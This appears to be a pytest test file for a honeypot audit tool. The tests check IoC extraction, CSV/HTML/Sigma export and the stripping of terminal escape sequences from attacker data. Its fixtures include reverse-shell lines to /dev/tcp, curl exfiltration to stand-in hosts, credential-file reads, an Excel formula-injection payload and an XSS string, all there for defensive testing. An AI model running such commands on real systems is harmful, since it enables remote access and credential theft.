"""Unit tests for tools/audit.py — IoC export, summary narrative, html, csv."""
import importlib.util
import json
import sys
from pathlib import Path

import pytest

# Load audit.py as a module
_ROOT = Path(__file__).resolve().parent.parent
_spec = importlib.util.spec_from_file_location("audit_mod", _ROOT / "tools" / "audit.py")
audit = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(audit)


def _make_engagement(eid="abc12345-...", user="jdoe", ip="127.0.0.1",
                     observed=None, alerts=None, vfs=None,
                     commands=None):
    """Build an engagement dict in the shape `load_engagements` would return."""
    import time
    obs = {
        "ran_sudo": False, "services_probed": [], "attempted_lateral": False,
        "found_crown_jewel": False, "isolated": False,
        "credential_files_read": [], "honeytoken_modifications": [],
        "honeytoken_deletions": [], "payload_drops": [],
        "ssh_persistence_attempt": False, "bash_history_inspected": False,
        "credential_search_attempted": False, "credential_search_terms": [],
        "reverse_shell_attempted": False, "reverse_shell_command": "",
        "dns_exfil_attempted": False, "dns_exfil_commands": [],
        "lateral_to_decoy": False, "decoy_targets": [],
        "log_tampering": False, "tampering_commands": [],
        "attempted_sudo_elevation": False,
        "decoys_planted": [], "decoys_swallowed": [],
    }
    if observed:
        obs.update(observed)
    log = {
        "id": "fake-log",
        "engagement_id": eid,
        "started_at": time.time() - 60,
        "actions_taken": alerts or [],
        "commands": commands or [],
        "connection_count": 1,
    }
    return {
        "engagement_id": eid,
        "claimed_user": user,
        "source_ip": ip,
        "first_seen_at": time.time() - 60,
        "last_seen_at": time.time(),
        "connection_count": 1,
        "cwd": f"/home/{user}",
        "vfs": vfs or {"files": {}, "deleted": []},
        "observed": obs,
        "logs": [log],
        "personas_dir": _ROOT / "personas",
    }


class TestANSIEscapeSanitizer:
    """C-2 regression: attacker-controlled strings (SSH username, command
    text, planted paths) flow into the operator's terminal via
    `python tools/audit.py`. Without sanitization an attacker can clear
    the analyst's screen, hide alerts, smuggle OSC-8 hyperlinks (paste-on-
    click), or in some xterm builds trigger window-title queries with
    side effects.

    The _safe() helper must strip ALL escape sequences and C0/C1 control
    bytes while preserving normal whitespace so multi-line commands and
    tabbed output stay readable."""

    def test_strips_csi_clear_screen(self):
        # ESC [ 2 J = clear screen, the textbook deface escape
        out = audit._safe("hello\x1b[2Jworld")
        assert "\x1b" not in out
        assert "[2J" not in out
        assert "hello" in out and "world" in out

    def test_strips_csi_cursor_move(self):
        out = audit._safe("\x1b[H\x1b[10;5HEVIL")
        assert "\x1b" not in out
        assert "EVIL" in out

    def test_strips_csi_color_sgr(self):
        # An attacker emitting fake colors to make their commands look benign
        out = audit._safe("\x1b[32mlooks-green\x1b[0m")
        assert "\x1b" not in out
        assert "looks-green" in out

    def test_strips_osc8_hyperlink(self):
        # OSC 8 hyperlink: \x1b]8;;URL\x07TEXT\x1b]8;;\x07
        # The most dangerous modern escape — paste-on-click on many terminals.
        payload = "\x1b]8;;https://evil.example/payload\x07click-me\x1b]8;;\x07"
        out = audit._safe(payload)
        assert "\x1b" not in out
        assert "]8" not in out
        # Visible text survives — analyst can still see "click-me" but
        # without the hyperlink machinery.
        assert "click-me" in out

    def test_strips_osc_window_title(self):
        # OSC 0 sets the window title — attacker can deface or phish
        out = audit._safe("\x1b]0;FAKE TITLE\x07real-cmd")
        assert "\x1b" not in out
        assert "real-cmd" in out

    def test_strips_bell_and_backspace(self):
        out = audit._safe("alert\x07\x08\x08\x08silence")
        assert "\x07" not in out
        assert "\x08" not in out

    def test_strips_null_byte(self):
        out = audit._safe("before\x00after")
        assert "\x00" not in out

    def test_preserves_tab_and_newline(self):
        # Whitespace controls intentionally preserved — multi-line attacker
        # commands and tab-aligned output should still render naturally.
        out = audit._safe("line1\nline2\tcolumn2\rline3")
        assert "\n" in out
        assert "\t" in out
        assert "\r" in out

    def test_strips_c1_8bit_controls(self):
        # 8-bit C1 controls (\x80-\x9f) — equivalent to ESC + 0x40-0x5f.
        # Some terminals interpret these even without preceding ESC.
        out = audit._safe("a\x9bDb")  # CSI (0x9b) equivalent
        assert "\x9b" not in out

    def test_idempotent(self):
        once = audit._safe("\x1b[2Jhello")
        twice = audit._safe(once)
        assert once == twice

    def test_none_returns_empty_string(self):
        assert audit._safe(None) == ""

    def test_non_string_coerced(self):
        # Some attacker-controlled fields may be numeric (timestamps,
        # counts) — coerce defensively rather than blowing up.
        assert audit._safe(42) == "42"
        assert audit._safe([]) == "[]"


class TestPrintDetailSanitizesAttackerData:
    """End-to-end check: build an engagement with an attacker payload in
    every attacker-controlled field, render via print_detail, and verify
    no escape sequences reach stdout. This is the integration test for
    the C-2 fix surface."""

    def test_print_detail_strips_escapes_from_all_attacker_fields(self, capsys):
        evil = "\x1b[2J\x1b]0;PWNED\x07"
        eng = _make_engagement(
            user=f"jdoe{evil}",
            observed={
                "credential_search_terms": [f"password{evil}"],
                "dns_exfil_commands": [f"curl http://evil{evil}.example/x"],
                "payload_drops": [f"/tmp/{evil}stolen"],
            },
            alerts=[{
                "action": "alert_dns_exfil",
                "severity": "high",
                "triggered_by": f"curl{evil} http://example.com",
                "rationale": f"Exfil attempt{evil} to suspicious host",
            }],
            commands=[{
                "ts": 1_000_000_000.0,
                "cmd": f"cat{evil} /etc/passwd",
                "response_source": "vfs-read",
            }],
        )
        eng["cwd"] = f"/home/jdoe{evil}"
        audit.print_detail(eng)
        out = capsys.readouterr().out
        # No escape sequences in any form
        assert "\x1b" not in out, "ESC byte leaked to operator terminal"
        assert "\x07" not in out, "BEL byte leaked to operator terminal"
        assert "PWNED" not in out or out.count("PWNED") == 0, \
            "OSC window-title payload reached terminal"


class TestDockerLogsDiscovery:
    """Bug #6 regression: `load_engagements` must find session logs in
    the docker-stack layout (`state-docker/logs/<hostname>/*.json`) as
    well as the dev-mode flat layout (`logs/*.json`). Pre-fix, the flat
    glob silently dropped every docker-stack log."""

    def test_iter_log_files_finds_flat_layout(self, tmp_path):
        # Dev-mode: logs live directly in logs/
        (tmp_path / "1700000000_aaa.json").write_text("{}", encoding="utf-8")
        (tmp_path / "1700000001_bbb.json").write_text("{}", encoding="utf-8")
        found = sorted(p.name for p in audit._iter_log_files(tmp_path))
        assert found == ["1700000000_aaa.json", "1700000001_bbb.json"]

    def test_iter_log_files_finds_docker_layout(self, tmp_path):
        # Docker stack: logs live under per-hostname subdirs
        (tmp_path / "bastion-prod").mkdir()
        (tmp_path / "bastion-prod" / "1700000000_aaa.json").write_text("{}")
        (tmp_path / "api-prod-03").mkdir()
        (tmp_path / "api-prod-03" / "1700000001_bbb.json").write_text("{}")
        found = sorted(p.name for p in audit._iter_log_files(tmp_path))
        assert found == ["1700000000_aaa.json", "1700000001_bbb.json"]

    def test_iter_log_files_finds_mixed_layout(self, tmp_path):
        # Both: a flat file at the top AND files under host subdirs
        (tmp_path / "1700000000_flat.json").write_text("{}")
        (tmp_path / "bastion-prod").mkdir()
        (tmp_path / "bastion-prod" / "1700000001_nested.json").write_text("{}")
        found = sorted(p.name for p in audit._iter_log_files(tmp_path))
        assert found == ["1700000000_flat.json", "1700000001_nested.json"]

    def test_iter_log_files_skips_non_json_in_subdirs(self, tmp_path):
        (tmp_path / "bastion-prod").mkdir()
        (tmp_path / "bastion-prod" / "real.json").write_text("{}")
        (tmp_path / "bastion-prod" / "README.md").write_text("not a log")
        (tmp_path / "bastion-prod" / "stale.txt").write_text("not a log")
        found = sorted(p.name for p in audit._iter_log_files(tmp_path))
        assert found == ["real.json"]

    def test_iter_log_files_handles_missing_dir(self, tmp_path):
        missing = tmp_path / "does-not-exist"
        assert list(audit._iter_log_files(missing)) == []

    def test_load_engagements_finds_docker_logs(self, tmp_path):
        """End-to-end: a persistence file plus a docker-layout session
        log under hostname-subdir must round-trip to produce a fully
        populated engagement entry with commands + actions."""
        import time
        state_dir = tmp_path / "persistence"
        logs_dir = tmp_path / "logs"
        state_dir.mkdir()
        (logs_dir / "bastion-prod").mkdir(parents=True)

        eid = "11111111-2222-3333-4444-555555555555"
        # Persistence file (engagement metadata)
        (state_dir / "1.2.3.4__jdoe.json").write_text(json.dumps({
            "engagement_id": eid,
            "claimed_user": "jdoe",
            "source_ip": "1.2.3.4",
            "first_seen_at": time.time() - 60,
            "last_seen_at": time.time(),
            "connection_count": 1,
            "cwd": "/home/jdoe",
            "vfs": {"files": {}, "deleted": []},
            "observed": {},
        }), encoding="utf-8")
        # Per-connection log (in the docker layout: under hostname/)
        (logs_dir / "bastion-prod" / "1700000000_xyz.json").write_text(json.dumps({
            "engagement_id": eid,
            "started_at": time.time() - 30,
            "commands": [{"ts": time.time() - 25, "cmd": "uname -a",
                          "response_source": "cache"}],
            "actions_taken": [{
                "action": "alert_dns_exfil",
                "severity": "high",
                "triggered_by": "curl example.com",
            }],
        }), encoding="utf-8")

        engs = audit.load_engagements(
            state_dir, logs_dir, _ROOT / "personas",
        )
        assert len(engs) == 1
        eng = engs[0]
        assert eng["engagement_id"] == eid
        assert len(eng["logs"]) == 1, "docker-layout log must be picked up"
        assert eng["logs"][0]["actions_taken"][0]["action"] == "alert_dns_exfil"


class TestCSVFormulaInjection:
    """C-3 regression: every attacker-controlled cell in IoC CSV export
    must be prefixed with `'` if it starts with a formula trigger byte
    (`=`, `+`, `-`, `@`, tab, carriage return). Pre-fix, an attacker who
    runs `touch /tmp/=cmd|'/c calc.exe'!A0` lands code execution when
    the analyst opens the IoC CSV in Excel."""

    def test_csv_safe_prefixes_equals(self):
        assert audit._csv_safe("=cmd|'/c calc.exe'!A0").startswith("'=")

    def test_csv_safe_prefixes_plus(self):
        assert audit._csv_safe("+1-555-EVIL").startswith("'+")

    def test_csv_safe_prefixes_minus(self):
        assert audit._csv_safe("-2+3").startswith("'-")

    def test_csv_safe_prefixes_at(self):
        # @SUM(...) is the LibreOffice/older-Excel formula trigger
        assert audit._csv_safe("@SUM(1+1)").startswith("'@")

    def test_csv_safe_prefixes_tab(self):
        # Tab-leading cells in some Excel imports are treated as formulas
        assert audit._csv_safe("\t=cmd").startswith("'\t")

    def test_csv_safe_preserves_normal_value(self):
        assert audit._csv_safe("/tmp/normal-payload") == "/tmp/normal-payload"

    def test_csv_safe_strips_embedded_newlines(self):
        # An attacker payload with newlines could break out of one cell
        # into the next row, smuggling fake IoC rows into the CSV.
        s = audit._csv_safe("a\nb\r\nc")
        assert "\n" not in s and "\r" not in s

    def test_ioc_export_csv_quotes_exfil_domain_starting_with_dash(self):
        """End-to-end real attack: the URL regex in export_ioc captures
        hostnames matching `[\\w.-]+`, which allows a leading hyphen.
        An attacker who runs `curl https://-evil.example/x` produces an
        exfil_domain value of `-evil.example` — which Excel/Sheets would
        treat as a formula trigger. The CSV export must prefix it
        with a single quote."""
        eng = _make_engagement(
            observed={
                "dns_exfil_attempted": True,
                "dns_exfil_commands": ["curl https://-evil.example/payload"],
            },
        )
        csv_out = audit.export_ioc(eng, as_csv=True)
        # The dangerous exfil-domain row must have the leading dash
        # quoted as text rather than parsed as a negative number / formula.
        assert "'-evil.example" in csv_out, (
            f"exfil_domain with leading `-` must be CSV-injection-safe; "
            f"got: {csv_out!r}"
        )
        # Header still present
        assert csv_out.startswith("type,value,severity,")

    def test_ioc_export_csv_preserves_safe_paths(self):
        """Normal absolute paths (the common case) start with `/` and
        shouldn't get a stray `'` prefix — the sanitizer is precise about
        WHICH cells need quoting."""
        eng = _make_engagement(
            observed={
                "payload_drops": ["/tmp/safe", "/tmp/also-safe"],
                "credential_files_read": ["/home/jdoe/.aws/credentials"],
            },
        )
        csv_out = audit.export_ioc(eng, as_csv=True)
        assert "/tmp/safe" in csv_out
        # Should NOT add a leading `'` to safe values
        assert "'/tmp/" not in csv_out
        assert "'/home" not in csv_out

    def test_ioc_export_csv_handles_comma_in_path(self):
        """A path containing `,` would corrupt the row under f-string
        concatenation. csv.writer must properly quote it."""
        eng = _make_engagement(
            observed={"payload_drops": ["/tmp/path,with,commas"]},
        )
        csv_out = audit.export_ioc(eng, as_csv=True)
        # The row should remain parseable as 6 columns
        import csv as _csv
        import io as _io
        rows = list(_csv.reader(_io.StringIO(csv_out)))
        # Header + at least one data row containing our payload
        data_rows = [r for r in rows[1:] if r and "path,with,commas" in r[1]]
        assert len(data_rows) == 1
        assert len(data_rows[0]) == 6, "row must still have 6 columns"


class TestIoCExport:
    def test_basic_structure(self):
        eng = _make_engagement()
        out = json.loads(audit.export_ioc(eng))
        assert out["engagement_id"] == eng["engagement_id"]
        assert out["claimed_user"] == "jdoe"
        assert "alerts" in out
        assert "c2_endpoints" in out
        assert "exfil_domains" in out

    def test_c2_extraction_from_revshell(self):
        eng = _make_engagement(observed={
            "reverse_shell_attempted": True,
            "reverse_shell_command": "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1",
        })
        out = json.loads(audit.export_ioc(eng))
        assert any(c["ip"] == "198.51.100.7" and c["port"] == 4444 for c in out["c2_endpoints"])

    def test_exfil_domain_extraction(self):
        eng = _make_engagement(observed={
            "dns_exfil_attempted": True,
            "dns_exfil_commands": ["curl https://attacker.example.com/exfil", "curl https://x.ngrok.io/$(whoami)"],
        })
        out = json.loads(audit.export_ioc(eng))
        hosts = {d["host"] for d in out["exfil_domains"]}
        assert "attacker.example.com" in hosts
        assert "x.ngrok.io" in hosts

    def test_alerts_sorted_by_severity(self):
        eng = _make_engagement(alerts=[
            {"action": "alert_credential_exfil", "severity": "high", "triggered_by": "cat ~/.aws/credentials", "ts_offset_s": 5},
            {"action": "alert_reverse_shell", "severity": "critical", "triggered_by": "bash -i", "ts_offset_s": 10},
            {"action": "plant_sudo_vulnerability", "severity": "info", "triggered_by": "sudo -l", "ts_offset_s": 1},
        ])
        out = json.loads(audit.export_ioc(eng))
        names = [a["name"] for a in out["alerts"]]
        assert names == ["alert_reverse_shell", "alert_credential_exfil", "plant_sudo_vulnerability"]

    def test_csv_format(self):
        eng = _make_engagement(observed={
            "reverse_shell_attempted": True,
            "reverse_shell_command": "bash -i >& /dev/tcp/1.2.3.4/9999 0>&1",
            "dns_exfil_attempted": True,
            "dns_exfil_commands": ["curl https://x.ngrok.io/exfil"],
            "decoy_targets": ["db-prod-01"],
            "credential_files_read": ["/home/jdoe/.aws/credentials"],
        })
        csv = audit.export_ioc(eng, as_csv=True)
        assert "type,value,severity" in csv  # header
        assert "c2_ip,1.2.3.4:9999,critical" in csv
        assert "exfil_domain,x.ngrok.io,high" in csv
        assert "lateral_target,db-prod-01,high" in csv


class TestNarrativeBuilder:
    def test_idle_engagement_says_idle(self):
        eng = _make_engagement()
        out = audit.build_narrative(eng)
        assert "[info]" in out.lower() or "idle" in out.lower()

    def test_critical_renders_crit_badge(self):
        eng = _make_engagement(alerts=[{
            "action": "alert_reverse_shell", "severity": "critical",
            "triggered_by": "bash -i >& /dev/tcp/1.2.3.4/9000 0>&1", "ts_offset_s": 1,
        }], observed={
            "reverse_shell_attempted": True,
            "reverse_shell_command": "bash -i >& /dev/tcp/1.2.3.4/9000 0>&1",
        })
        out = audit.build_narrative(eng)
        assert "CRIT" in out
        assert "1.2.3.4:9000" in out

    def test_exfil_domain_extracted_into_narrative(self):
        eng = _make_engagement(alerts=[{
            "action": "alert_dns_exfil", "severity": "high",
            "triggered_by": "curl https://x.ngrok.io/exfil", "ts_offset_s": 1,
        }], observed={
            "dns_exfil_attempted": True,
            "dns_exfil_commands": ["curl https://x.ngrok.io/exfil"],
        })
        out = audit.build_narrative(eng)
        assert "exfil" in out
        assert "ngrok.io" in out


class TestHTMLReport:
    def test_renders_valid_html(self):
        eng = _make_engagement()
        html = audit.render_html(eng)
        assert html.startswith("<!doctype html>")
        assert "</html>" in html
        assert eng["engagement_id"] in html

    def test_no_xss_via_command_text(self):
        eng = _make_engagement(alerts=[{
            "action": "alert_dns_exfil", "severity": "high",
            "triggered_by": '<script>alert("xss")</script>', "ts_offset_s": 1,
        }])
        html = audit.render_html(eng)
        # The literal `<script>` must NOT be present unescaped
        assert "<script>alert" not in html
        assert "&lt;script&gt;" in html

    def test_alert_count_matches(self):
        eng = _make_engagement(alerts=[
            {"action": "alert_credential_exfil", "severity": "high", "triggered_by": "cat", "ts_offset_s": 1},
            {"action": "alert_reverse_shell", "severity": "critical", "triggered_by": "bash", "ts_offset_s": 2},
        ])
        html = audit.render_html(eng)
        assert "Alerts (2)" in html


class TestSigmaExport:
    def test_yaml_parses(self):
        import yaml
        eng = _make_engagement(alerts=[
            {"action": "alert_reverse_shell", "severity": "critical",
             "triggered_by": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "ts_offset_s": 1},
        ], observed={
            "reverse_shell_attempted": True,
            "reverse_shell_command": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        })
        sigma_text = audit.render_sigma(eng)
        # Parse each YAML document; skip the header comment
        body = sigma_text.split("\n", 1)[1]
        docs = list(yaml.safe_load_all(body))
        assert len(docs) >= 1
        for d in docs:
            if d is None:
                continue
            # Sigma required fields
            assert "title" in d
            assert "id" in d
            assert "detection" in d
            assert "level" in d

    def test_id_is_deterministic_per_engagement_action(self):
        eng = _make_engagement(eid="aaa11111-...", alerts=[
            {"action": "alert_reverse_shell", "severity": "critical",
             "triggered_by": "bash", "ts_offset_s": 1},
        ])
        a = audit.render_sigma(eng)
        b = audit.render_sigma(eng)
        assert a == b  # determinism

    def test_c2_ip_in_emitted_detection(self):
        eng = _make_engagement(alerts=[
            {"action": "alert_reverse_shell", "severity": "critical",
             "triggered_by": "bash", "ts_offset_s": 1},
        ], observed={
            "reverse_shell_attempted": True,
            "reverse_shell_command": "bash -i >& /dev/tcp/9.9.9.9/8888 0>&1",
        })
        sigma_text = audit.render_sigma(eng)
        assert "9.9.9.9" in sigma_text
        assert "8888" in sigma_text

    def test_exfil_domain_in_emitted_detection(self):
        eng = _make_engagement(alerts=[
            {"action": "alert_dns_exfil", "severity": "high",
             "triggered_by": "curl https://evil.example.com/x", "ts_offset_s": 1},
        ], observed={
            "dns_exfil_attempted": True,
            "dns_exfil_commands": ["curl https://evil.example.com/x"],
        })
        sigma_text = audit.render_sigma(eng)
        assert "evil.example.com" in sigma_text

    def test_no_alerts_returns_header_only(self):
        eng = _make_engagement()  # no alerts
        out = audit.render_sigma(eng)
        assert "no alerts" in out.lower() or "experimental" not in out


class TestDurationParsing:
    def test_parses_units(self):
        assert audit._parse_duration("60s") == 60
        assert audit._parse_duration("5m") == 300
        assert audit._parse_duration("2h") == 7200
        assert audit._parse_duration("1d") == 86400
        assert audit._parse_duration("1w") == 604800

    def test_bare_number_is_seconds(self):
        assert audit._parse_duration("90") == 90

    def test_invalid_returns_none(self):
        assert audit._parse_duration("xyz") is None
